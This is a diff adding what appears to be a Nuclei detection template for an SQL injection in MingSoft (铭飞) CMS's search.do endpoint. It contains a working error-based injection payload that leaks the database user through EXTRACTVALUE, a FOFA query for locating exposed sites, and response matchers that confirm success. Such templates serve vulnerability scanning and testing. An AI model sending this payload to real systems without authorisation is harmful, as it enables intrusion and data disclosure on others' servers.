@@ -1,0 +1,29 @@
+id: mingsoft-search-sqli
+
+info:
+  name: 铭飞 CMS search.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://blog.csdn.net/qq_39894062/article/details/138379100
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+  tags: mingsoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"12321","springframework")
